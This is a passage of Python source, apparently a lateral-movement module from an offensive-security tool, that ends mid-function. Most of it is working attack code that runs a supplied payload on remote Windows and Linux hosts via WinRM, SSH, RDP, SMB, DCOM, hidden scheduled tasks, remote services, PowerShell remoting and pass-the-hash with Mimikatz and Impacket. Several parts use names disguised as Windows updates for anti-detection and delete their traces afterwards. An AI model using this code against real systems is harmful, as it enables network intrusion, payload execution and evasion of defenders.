                    f"-r:{target_ip}",
                    f"-u:{username}",
                    f"-p:{password}",
                    "echo test",
                ],
                check=False,
                capture_output=True,
                text=True,
                shell=False,
            )  # Explicitly secure - using list format prevents shell injection

            if process.returncode == 0:
                result["success"] = True
                result["session_id"] = session_id
                result["details"] = {
                    "method": "winrm",
                    "target_ip": target_ip,
                    "username": username,
                }

                # Execute payload if provided
                if payload_path:
                    secure_run(
                        [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            winrs_path,
                            f"-r:{target_ip}",
                            f"-u:{username}",
                            f"-p:{password}",
                            payload_path,
                        ],
                        check=False,
                        shell=False,
                    )  # Explicitly secure - using list format prevents shell injection

            else:
                result["error"] = f"WinRM connection failed: {process.stderr}"

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    # Linux movement techniques

    def _linux_ssh(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """SSH lateral movement."""
        result = {
            "success": False,
            "session_id": None,
            "details": {},
            "error": None,
        }

        try:
            username = credentials.get("username")
            password = credentials.get("password")

            if not username or not password:
                result["error"] = "Username and password required for SSH"
                return result

            session_id = self._generate_session_id()

            # Test SSH connection
            sshpass_path = shutil.which("sshpass")
            ssh_path = shutil.which("ssh")
            if not sshpass_path or not ssh_path:
                result["error"] = "sshpass or ssh command not found in PATH"
                return result

            process = secure_run(
                [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    sshpass_path,
                    "-p",
                    password,
                    ssh_path,
                    "-o",
                    "StrictHostKeyChecking=no",
                    f"{username}@{target_ip}",
                    "echo test",
                ],
                check=False,
                capture_output=True,
                text=True,
                shell=False,
            )  # Explicitly secure - using list format prevents shell injection

            if process.returncode == 0:
                result["success"] = True
                result["session_id"] = session_id
                result["details"] = {
                    "method": "ssh",
                    "target_ip": target_ip,
                    "username": username,
                }

                # Execute payload if provided
                if payload_path:
                    ssh_result = self.execute_ssh_command(
                        target_ip,
                        username,
                        payload_path,
                        password=password,
                    )
                    result["payload_execution"] = ssh_result
                    if ssh_result.get("success"):
                        result["payload_status"] = "executed"
                    else:
                        result["payload_status"] = "failed"

            else:
                result["error"] = f"SSH connection failed: {process.stderr}"

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    def _linux_ssh_key(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """SSH key-based lateral movement."""
        result = self.init_result(
            session_id=None,
            details={},
        )

        try:
            username = credentials.get("username")
            private_key_path = credentials.get("private_key_path")

            if not username or not private_key_path:
                result["error"] = "Username and private key path required for SSH key auth"
                return result

            session_id = self._generate_session_id()

            # Test SSH key connection
            ssh_path = shutil.which("ssh")
            if not ssh_path:
                result["error"] = "ssh command not found in PATH"
                return result

            process = secure_run(
                [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    ssh_path,
                    "-i",
                    private_key_path,
                    "-o",
                    "StrictHostKeyChecking=no",
                    f"{username}@{target_ip}",
                    "echo test",
                ],
                check=False,
                capture_output=True,
                text=True,
                shell=False,
            )  # Explicitly secure - using list format prevents shell injection

            if process.returncode == 0:
                result["success"] = True
                result["session_id"] = session_id
                result["details"] = {
                    "method": "ssh_key",
                    "target_ip": target_ip,
                    "username": username,
                    "private_key_path": private_key_path,
                }

                # Execute payload if provided
                if payload_path:
                    secure_run(
                        [  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            ssh_path,
                            "-i",
                            private_key_path,
                            "-o",
                            "StrictHostKeyChecking=no",
                            f"{username}@{target_ip}",
                            payload_path,
                        ],
                        check=False,
                        shell=False,
                    )  # Explicitly secure - using list format prevents shell injection

            else:
                result["error"] = f"SSH key connection failed: {process.stderr}"

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            logger.error(
                "(FileNotFoundError, PermissionError, OSError, IOError, AttributeError, ValueError, TypeError, RuntimeError, subprocess.SubprocessError, socket.error, ConnectionError) in lateral_movement.py: %s",
                e,
            )
            self.handle_result_error(result, e)

        return result

    # Additional technique stubs (would be fully implemented)

    def _windows_rdp(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """RDP lateral movement implementation."""
        try:
            username = credentials.get("username", "")
            password = credentials.get("password", "")
            domain = credentials.get("domain", "")

            if not username or not password:
                return {
                    "success": False,
                    "error": "Username and password required for RDP",
                    "target_ip": target_ip,
                }

            self.logger.info("Attempting RDP connection to %s as %s\\%s", target_ip, domain, username)

            # Check if RDP port is open
            rdp_check = self._check_rdp_availability(target_ip)
            if not rdp_check["available"]:
                return {
                    "success": False,
                    "error": f"RDP not available on {target_ip}: {rdp_check['reason']}",
                    "target_ip": target_ip,
                    "port_check": rdp_check,
                }

            # Attempt RDP connection using different methods
            connection_methods = ["freerdp", "rdesktop", "xfreerdp"]
            connection_result = None

            for method in connection_methods:
                try:
                    connection_result = self._attempt_rdp_connection(
                        target_ip,
                        username,
                        password,
                        domain,
                        method,
                        payload_path,
                    )
                    if connection_result["success"]:
                        break
                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as e:
                    self.logger.debug("RDP method %s failed: %s", method, e)
                    continue

            if connection_result and connection_result["success"]:
                # Execute payload if provided
                if payload_path and os.path.exists(payload_path):
                    execution_result = self._execute_rdp_payload(
                        target_ip,
                        username,
                        password,
                        domain,
                        payload_path,
                        connection_result.get("method"),
                    )
                    connection_result["payload_execution"] = execution_result

                return {
                    "success": True,
                    "target_ip": target_ip,
                    "method": "rdp",
                    "connection_details": connection_result,
                    "credentials_used": {"username": username, "domain": domain},
                }
            return {
                "success": False,
                "error": "All RDP connection methods failed",
                "target_ip": target_ip,
                "attempted_methods": connection_methods,
                "last_error": connection_result.get("error") if connection_result else "No connection attempt made",
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("RDP lateral movement failed: %s", e)
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
                "method": "rdp",
            }

    def _windows_smb_relay(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """SMB relay attack implementation."""
        try:
            username = credentials.get("username", "")
            password = credentials.get("password", "")
            domain = credentials.get("domain", "")
            ntlm_hash = credentials.get("ntlm_hash", "")

            self.logger.info("Attempting SMB relay attack to %s", target_ip)

            # Check SMB availability
            smb_check = self._check_smb_availability(target_ip)
            if not smb_check["available"]:
                return {
                    "success": False,
                    "error": f"SMB not available on {target_ip}: {smb_check['reason']}",
                    "target_ip": target_ip,
                    "smb_check": smb_check,
                }

            # Attempt different SMB authentication methods
            auth_methods = []

            if ntlm_hash:
                auth_methods.append(("ntlm_hash", {"hash": ntlm_hash, "username": username, "domain": domain}))

            if username and password:
                auth_methods.append(("password", {"username": username, "password": password, "domain": domain}))

            if not auth_methods:
                auth_methods.append(("null_session", {}))

            connection_result = None
            successful_auth = None
            successful_auth_data = None

            for auth_method, auth_data in auth_methods:
                try:
                    self.logger.debug("Attempting SMB authentication using %s", auth_method)
                    connection_result = self._attempt_smb_connection(target_ip, auth_method, auth_data)

                    if connection_result["success"]:
                        successful_auth = auth_method
                        successful_auth_data = auth_data
                        break

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as e:
                    self.logger.debug("SMB auth method %s failed: %s", auth_method, e)
                    continue

            if connection_result and connection_result["success"]:
                result = {
                    "success": True,
                    "target_ip": target_ip,
                    "method": "smb_relay",
                    "authentication_method": successful_auth,
                    "connection_details": connection_result,
                    "available_shares": connection_result.get("shares", []),
                }

                # Attempt payload execution if provided
                if payload_path and os.path.exists(payload_path):
                    execution_result = self._execute_smb_payload(
                        target_ip,
                        successful_auth_data,
                        payload_path,
                        connection_result,
                    )
                    result["payload_execution"] = execution_result

                    if execution_result.get("success"):
                        result["payload_status"] = "executed"
                    else:
                        result["payload_status"] = "failed"
                        result["payload_error"] = execution_result.get("error")

                return result
            return {
                "success": False,
                "error": "All SMB authentication methods failed",
                "target_ip": target_ip,
                "attempted_methods": [method for method, _ in auth_methods],
                "last_error": connection_result.get("error") if connection_result else "No authentication attempted",
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("SMB relay attack failed: %s", e)
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
                "method": "smb_relay",
            }

    def _windows_dcom(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Execute commands on remote Windows system via DCOM."""
        self.logger.info("Executing DCOM lateral movement to %s", target_ip)

        try:
            import pythoncom
            import win32com.client
            import win32con

            username = credentials.get("username")
            password = credentials.get("password")
            domain = credentials.get("domain", ".")

            # Initialize COM
            pythoncom.CoInitialize()

            # Create DCOM connection string
            if domain and domain != ".":
                moniker = f"winmgmts:{{impersonationLevel=impersonate,authenticationLevel=pktPrivacy}}!//{target_ip}/root/cimv2"
            else:
                moniker = f"winmgmts://{target_ip}/root/cimv2"

            # Connect using credentials and moniker
            locator = win32com.client.Dispatch("WbemScripting.SWbemLocator")

            # Store moniker for logging and debugging
            logger.debug(f"Connecting to WMI using moniker: {moniker}")

            # Authenticate
            if username and password:
                connection = locator.ConnectServer(target_ip, "root\\cimv2", username, password)
            else:
                connection = locator.ConnectServer(target_ip, "root\\cimv2")

            # Method 1: WMI Win32_Process Create
            process_startup = connection.Get("Win32_ProcessStartup").SpawnInstance_()
            process_startup.ShowWindow = win32con.SW_HIDE

            process = connection.Get("Win32_Process")

            # Execute command
            if payload_path:
                command = f"cmd.exe /c {payload_path}"
            else:
                # Default reconnaissance command
                command = "cmd.exe /c whoami > C:\\Windows\\Temp\\dcom_test.txt"

            result, process_id = process.Create(
                CommandLine=command,
                ProcessStartupInformation=process_startup,
            )

            if result == 0:
                self.logger.info("DCOM execution successful, process ID: %d", process_id)

                # Method 2: Alternative DCOM via MMC20.Application
                try:
                    mmc = win32com.client.Dispatch("MMC20.Application", target_ip)
                    mmc.Document.ActiveView.ExecuteShellCommand(
                        "cmd.exe",
                        f"/c {payload_path}" if payload_path else "/c echo DCOM_SUCCESS > C:\\dcom_test.txt",
                    )
                except (Exception, AttributeError) as e:
                    logger.debug(f"Failed to execute DCOM command: {e}")

                # Method 3: ShellWindows DCOM
                try:
                    shell = win32com.client.Dispatch("Shell.Application", target_ip)
                    shell.ShellExecute(
                        "cmd.exe",
                        f"/c {payload_path}" if payload_path else "/c whoami",
                        "",
                        "",
                        0,
                    )
                except (Exception, AttributeError) as e:
                    logger.debug(f"Failed to execute DCOM command: {e}")

                return {
                    "success": True,
                    "method": "dcom",
                    "target_ip": target_ip,
                    "process_id": process_id,
                    "command": command,
                }
            return {
                "success": False,
                "error": f"DCOM execution failed with code {result}",
                "target_ip": target_ip,
            }

        except Exception as e:
            self.logger.error("DCOM lateral movement failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }
        finally:
            try:
                pythoncom.CoUninitialize()
            except (Exception, AttributeError) as e:
                logger.debug(f"Failed to uninitialize COM: {e}")

    def _windows_scheduled_task_remote(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Create and execute scheduled task on remote Windows system."""
        self.logger.info("Creating remote scheduled task on %s", target_ip)

        try:
            import datetime
            import random
            import string
            import subprocess

            username = credentials.get("username")
            password = credentials.get("password")
            domain = credentials.get("domain", "")

            # Generate random task name
            task_name = "MicrosoftUpdate" + "".join(
                random.choices(string.ascii_letters + string.digits, k=8)  # noqa: S311 - Task name uniqueness for anti-detection
            )

            # Build schtasks command
            if payload_path:
                task_command = payload_path
            else:
                task_command = "cmd.exe /c whoami > C:\\Windows\\Temp\\schtask_test.txt"

            # Create scheduled task XML for more control
            task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{datetime.datetime.now().isoformat()}</Date>
    <Author>{domain}\\{username if username else "SYSTEM"}</Author>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>{(datetime.datetime.now() + datetime.timedelta(minutes=1)).isoformat()}</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{task_command}</Command>
    </Exec>
  </Actions>
</Task>"""

            # Save XML temporarily
            import tempfile

            with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False) as f:
                f.write(task_xml)
                xml_path = f.name

            try:
                # Method 1: Using schtasks with XML
                create_cmd = [
                    "schtasks",
                    "/create",
                    "/S",
                    target_ip,
                    "/TN",
                    task_name,
                    "/XML",
                    xml_path,
                ]

                if username and password:
                    create_cmd.extend(["/U", f"{domain}\\{username}" if domain else username, "/P", password])

                result = subprocess.run(create_cmd, check=False, capture_output=True, text=True, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                if result.returncode == 0:
                    # Run the task immediately
                    run_cmd = [
                        "schtasks",
                        "/run",
                        "/S",
                        target_ip,
                        "/TN",
                        task_name,
                    ]

                    if username and password:
                        run_cmd.extend(["/U", f"{domain}\\{username}" if domain else username, "/P", password])

                    run_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        run_cmd, check=False, capture_output=True, text=True
                    )

                    # Clean up - delete task after execution
                    delete_cmd = [
                        "schtasks",
                        "/delete",
                        "/S",
                        target_ip,
                        "/TN",
                        task_name,
                        "/F",
                    ]

                    if username and password:
                        delete_cmd.extend(["/U", f"{domain}\\{username}" if domain else username, "/P", password])

                    secure_run(delete_cmd, check=False, capture_output=True, text=True, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                    return {
                        "success": True,
                        "method": "scheduled_task",
                        "target_ip": target_ip,
                        "task_name": task_name,
                        "command": task_command,
                        "execution_result": run_result.stdout if run_result.returncode == 0 else run_result.stderr,
                    }
                # Method 2: Direct command without XML
                create_simple = [
                    "schtasks",
                    "/create",
                    "/S",
                    target_ip,
                    "/TN",
                    task_name,
                    "/TR",
                    task_command,
                    "/SC",
                    "ONCE",
                    "/ST",
                    (datetime.datetime.now() + datetime.timedelta(minutes=1)).strftime("%H:%M"),
                    "/F",
                ]

                if username and password:
                    create_simple.extend(["/U", f"{domain}\\{username}" if domain else username, "/P", password])
                    create_simple.extend(["/RP", password])
                else:
                    create_simple.extend(["/RU", "SYSTEM"])

                result2 = subprocess.run(create_simple, check=False, capture_output=True, text=True, shell=False)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603

                if result2.returncode == 0:
                    return {
                        "success": True,
                        "method": "scheduled_task_simple",
                        "target_ip": target_ip,
                        "task_name": task_name,
                        "command": task_command,
                    }
                return {
                    "success": False,
                    "error": f"Task creation failed: {result.stderr}",
                    "target_ip": target_ip,
                }

            finally:
                # Clean up XML file
                try:
                    import os

                    os.unlink(xml_path)
                except (FileNotFoundError, OSError, PermissionError) as e:
                    logger.debug(f"Failed to remove XML file: {e}")

        except Exception as e:
            self.logger.error("Scheduled task creation failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _windows_service_creation(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Create and start a service on remote Windows system."""
        self.logger.info("Creating remote service on %s", target_ip)

        try:
            import random
            import string
            import subprocess

            username = credentials.get("username")
            password = credentials.get("password")
            domain = credentials.get("domain", "")

            # Generate random service name that looks legitimate
            service_names = ["WindowsUpdate", "SystemHealth", "NetworkDiagnostic", "SecurityHealth"]
            service_name = random.choice(service_names) + "".join(  # noqa: S311 - Service name for anti-detection
                random.choices(string.digits, k=4)  # noqa: S311 - Service name uniqueness
            )

            # Service binary path
            if payload_path:
                binpath = payload_path
            else:
                # Create a simple service that executes a command
                binpath = f'cmd.exe /c "echo SERVICE_EXECUTED > C:\\Windows\\Temp\\{service_name}.txt"'

            # Method 1: Using sc.exe
            create_cmd = [
                "sc",
                f"\\\\{target_ip}",
                "create",
                service_name,
                "binpath=",
                binpath,
                "start=",
                "auto",
                "DisplayName=",
                f'"{service_name} Service"',
            ]

            # Add credentials if provided
            if username and password:
                if domain:
                    create_cmd.extend(["obj=", f"{domain}\\{username}", "password=", password])
                else:
                    create_cmd.extend(["obj=", f".\\{username}", "password=", password])

            # Create the service
            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                create_cmd,
                check=False,
                capture_output=True,
                text=True,
                shell=False,  # Explicitly secure - using list format prevents shell injection
            )

            if result.returncode == 0 or "service exists" in result.stderr.lower():
                # Start the service
                start_cmd = ["sc", f"\\\\{target_ip}", "start", service_name]
                start_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    start_cmd,
                    check=False,
                    capture_output=True,
                    text=True,
                    shell=False,  # Explicitly secure - using list format prevents shell injection
                )

                # Wait a moment for execution
                import time

                time.sleep(2)

                # Stop and delete the service to clean up
                subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    ["sc", f"\\\\{target_ip}", "stop", service_name],  # noqa: S607
                    check=False,
                    capture_output=True,
                    shell=False,  # Explicitly secure - using list format prevents shell injection
                )
                subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    ["sc", f"\\\\{target_ip}", "delete", service_name],  # noqa: S607
                    check=False,
                    capture_output=True,
                    shell=False,  # Explicitly secure - using list format prevents shell injection
                )

                return {
                    "success": True,
                    "method": "service_creation",
                    "target_ip": target_ip,
                    "service_name": service_name,
                    "command": binpath,
                    "start_result": start_result.stdout if start_result.returncode == 0 else "Service created but start failed",
                }
            # Method 2: Using WMI via wmic
            wmic_cmd = [
                "wmic",
                f"/node:{target_ip}",
                "process",
                "call",
                "create",
                f'"{binpath}"',
            ]

            if username and password:
                wmic_cmd.insert(2, f"/user:{domain}\\{username}" if domain else f"/user:{username}")
                wmic_cmd.insert(3, f"/password:{password}")

            wmic_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                wmic_cmd,
                check=False,
                capture_output=True,
                text=True,
                shell=False,  # Explicitly secure - using list format prevents shell injection
            )

            if wmic_result.returncode == 0 and "ReturnValue = 0" in wmic_result.stdout:
                return {
                    "success": True,
                    "method": "wmic_process",
                    "target_ip": target_ip,
                    "command": binpath,
                    "output": wmic_result.stdout,
                }
            return {
                "success": False,
                "error": f"Service creation failed: {result.stderr}",
                "target_ip": target_ip,
            }

        except Exception as e:
            self.logger.error("Service creation failed: %s", str(e))
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
            }

    def _windows_powershell_remoting(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """PowerShell remoting implementation."""
        try:
            username = credentials.get("username", "")
            password = credentials.get("password", "")
            domain = credentials.get("domain", "")

            if not username or not password:
                return {
                    "success": False,
                    "error": "Username and password required for PowerShell remoting",
                    "target_ip": target_ip,
                }

            self.logger.info("Attempting PowerShell remoting to %s as %s\\%s", target_ip, domain, username)

            # Check WinRM availability
            winrm_check = self._check_winrm_availability(target_ip)
            if not winrm_check["available"]:
                return {
                    "success": False,
                    "error": f"WinRM not available on {target_ip}: {winrm_check['reason']}",
                    "target_ip": target_ip,
                    "winrm_check": winrm_check,
                }

            # Build PowerShell command for remote execution
            ps_commands = []

            # Basic connection test
            ps_commands.append("Get-ComputerInfo | Select-Object WindowsProductName, TotalPhysicalMemory")

            # If payload is provided, prepare it for execution
            if payload_path and os.path.exists(payload_path):
                payload_commands = self._prepare_powershell_payload(payload_path)
                ps_commands.extend(payload_commands)

            # Attempt PowerShell remoting using different methods
            execution_methods = ["invoke-command", "enter-pssession", "winrs"]
            execution_result = None
            successful_method = None

            for method in execution_methods:
                try:
                    self.logger.debug("Attempting PowerShell remoting using %s", method)
                    execution_result = self._execute_powershell_remote(
                        target_ip,
                        username,
                        password,
                        domain,
                        ps_commands,
                        method,
                    )

                    if execution_result["success"]:
                        successful_method = method
                        break

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    subprocess.SubprocessError,
                    ConnectionError,
                ) as e:
                    self.logger.debug("PowerShell method %s failed: %s", method, e)
                    continue

            if execution_result and execution_result["success"]:
                result = {
                    "success": True,
                    "target_ip": target_ip,
                    "method": "powershell_remoting",
                    "execution_method": successful_method,
                    "credentials_used": {"username": username, "domain": domain},
                    "execution_details": execution_result,
                    "commands_executed": len(ps_commands),
                }

                # Parse command outputs
                if "output" in execution_result:
                    result["system_info"] = self._parse_powershell_output(execution_result["output"])

                return result
            return {
                "success": False,
                "error": "All PowerShell remoting methods failed",
                "target_ip": target_ip,
                "attempted_methods": execution_methods,
                "last_error": execution_result.get("error") if execution_result else "No execution attempted",
            }

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
            ConnectionError,
        ) as e:
            self.logger.error("PowerShell remoting failed: %s", e)
            return {
                "success": False,
                "error": str(e),
                "target_ip": target_ip,
                "method": "powershell_remoting",
            }

    def _windows_pass_the_hash(self, target_ip: str, credentials: dict[str, Any], payload_path: str | None) -> dict[str, Any]:
        """Execute pass-the-hash attack for lateral movement."""
        self.logger.info("Executing pass-the-hash attack to %s", target_ip)

        try:
            import os
            import subprocess
            import tempfile

            username = credentials.get("username")
            nt_hash = credentials.get("nt_hash")
            lm_hash = credentials.get("lm_hash", "aad3b435b51404eeaad3b435b51404ee")  # Empty LM hash
            domain = credentials.get("domain", ".")

            if not nt_hash:
                return {
                    "success": False,
                    "error": "NT hash required for pass-the-hash",
                    "target_ip": target_ip,
                }

            # Method 1: Using Mimikatz
            # Define fallback command to avoid backslash in f-string
            fallback_cmd = r"whoami > C:\pth_test.txt"
            mimikatz_commands = f"""
privilege::debug
sekurlsa::pth /user:{username} /domain:{domain} /ntlm:{nt_hash} /run:"cmd.exe /c {payload_path if payload_path else fallback_cmd}"
exit
"""

            # Write Mimikatz script
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
                f.write(mimikatz_commands)
                script_path = f.name

            try:
                # Check if Mimikatz is available
                mimikatz_path = self._find_mimikatz()
                if mimikatz_path:
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        [mimikatz_path, f'"{script_path}"'],
                        check=False,
                        capture_output=True,
                        text=True,
                    )

                    if "OK" in result.stdout or "successfully" in result.stdout.lower():
                        return {
                            "success": True,
                            "method": "pass_the_hash_mimikatz",
                            "target_ip": target_ip,
                            "username": username,
                            "domain": domain,
                            "output": result.stdout,
                        }
            finally:
                os.unlink(script_path)

            # Method 2: Using Impacket's psexec
            try:
                # Check impacket availability for logging
                import impacket
                from impacket.examples import psexec

                logger.debug(f"Using Impacket version: {getattr(impacket, '__version__', 'unknown')}")

                # Create command for Impacket psexec
                command = payload_path if payload_path else "whoami"

                # Initialize the psexec client
                executer = psexec.PSEXEC(
                    command,
                    None,
                    None,
                    None,
                    445,
                    username,
                    "",
                    domain,
                    lmhash=lm_hash,
                    nthash=nt_hash,
                    aesKey=None,
                    doKerberos=False,
                )

                executer.run(target_ip)

                return {
                    "success": True,
                    "method": "pass_the_hash_impacket",
                    "target_ip": target_ip,
                    "username": username,
                    "domain": domain,
                }

            except ImportError:
                pass

            # Method 3: Using Windows built-in tools with hash injection
            # This requires administrative privileges and specific tools
            # Define fallback command to avoid backslash in f-string
            ps_fallback_cmd = r"cmd.exe /c whoami > C:\pth_test.txt"
            pth_command = f"""
# PowerShell PTH using WMI
$SecPassword = ConvertTo-SecureString '{nt_hash}' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', $SecPassword)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '{payload_path if payload_path else ps_fallback_cmd}' -ComputerName {target_ip} -Credential $Cred
"""

            # Save PowerShell script
            with tempfile.NamedTemporaryFile(mode="w", suffix=".ps1", delete=False) as f:
                f.write(pth_command)
                ps_path = f.name

            try:
                ps_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", ps_path],  # noqa: S607
                    check=False,
                    capture_output=True,
                    text=True,
                )

                if ps_result.returncode == 0:
                    return {
                        "success": True,
                        "method": "pass_the_hash_powershell",
                        "target_ip": target_ip,
                        "username": username,
                        "domain": domain,
                    }
            finally:
                os.unlink(ps_path)

            # Method 4: Create token with hash and use it via Windows API
            try:
                import ctypes
                from ctypes import wintypes

                # Windows API constants
                LOGON32_LOGON_NEW_CREDENTIALS = 9
                LOGON32_PROVIDER_DEFAULT = 0
                CREATE_NEW_CONSOLE = 0x00000010
                TOKEN_DUPLICATE = 0x0002
                TOKEN_QUERY = 0x0008
                TOKEN_IMPERSONATE = 0x0004
                TOKEN_ASSIGN_PRIMARY = 0x0001
                SecurityImpersonation = 2
                TokenPrimary = 1

                # Load Windows DLLs
                advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
                kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

                # Define Windows API functions
                LogonUserW = advapi32.LogonUserW
                LogonUserW.argtypes = [
                    wintypes.LPCWSTR,  # lpszUsername
                    wintypes.LPCWSTR,  # lpszDomain
                    wintypes.LPCWSTR,  # lpszPassword
                    wintypes.DWORD,  # dwLogonType
                    wintypes.DWORD,  # dwLogonProvider
                    ctypes.POINTER(wintypes.HANDLE),  # phToken
                ]
                LogonUserW.restype = wintypes.BOOL

                DuplicateTokenEx = advapi32.DuplicateTokenEx
                DuplicateTokenEx.argtypes = [
                    wintypes.HANDLE,  # hExistingToken
                    wintypes.DWORD,  # dwDesiredAccess
                    ctypes.c_void_p,  # lpTokenAttributes
                    ctypes.c_int,  # ImpersonationLevel
                    ctypes.c_int,  # TokenType
                    ctypes.POINTER(wintypes.HANDLE),  # phNewToken
                ]
                DuplicateTokenEx.restype = wintypes.BOOL

                CreateProcessAsUserW = advapi32.CreateProcessAsUserW
                CreateProcessAsUserW.argtypes = [
                    wintypes.HANDLE,  # hToken
                    wintypes.LPCWSTR,  # lpApplicationName
                    wintypes.LPWSTR,  # lpCommandLine
                    ctypes.c_void_p,  # lpProcessAttributes
                    ctypes.c_void_p,  # lpThreadAttributes
                    wintypes.BOOL,  # bInheritHandles
                    wintypes.DWORD,  # dwCreationFlags
                    ctypes.c_void_p,  # lpEnvironment
                    wintypes.LPCWSTR,  # lpCurrentDirectory
                    ctypes.c_void_p,  # lpStartupInfo
                    ctypes.c_void_p,  # lpProcessInformation
                ]
                CreateProcessAsUserW.restype = wintypes.BOOL

                CloseHandle = kernel32.CloseHandle
                CloseHandle.argtypes = [wintypes.HANDLE]
                CloseHandle.restype = wintypes.BOOL

                # STARTUPINFOW structure
                class STARTUPINFOW(ctypes.Structure):
                    _fields_ = [
                        ("cb", wintypes.DWORD),
                        ("lpReserved", wintypes.LPWSTR),
                        ("lpDesktop", wintypes.LPWSTR),
                        ("lpTitle", wintypes.LPWSTR),
                        ("dwX", wintypes.DWORD),
                        ("dwY", wintypes.DWORD),
                        ("dwXSize", wintypes.DWORD),
                        ("dwYSize", wintypes.DWORD),
                        ("dwXCountChars", wintypes.DWORD),
                        ("dwYCountChars", wintypes.DWORD),
                        ("dwFillAttribute", wintypes.DWORD),
                        ("dwFlags", wintypes.DWORD),
                        ("wShowWindow", wintypes.WORD),
                        ("cbReserved2", wintypes.WORD),
                        ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
                        ("hStdInput", wintypes.HANDLE),
                        ("hStdOutput", wintypes.HANDLE),
                        ("hStdError", wintypes.HANDLE),
                    ]

                # ProcessInformation structure
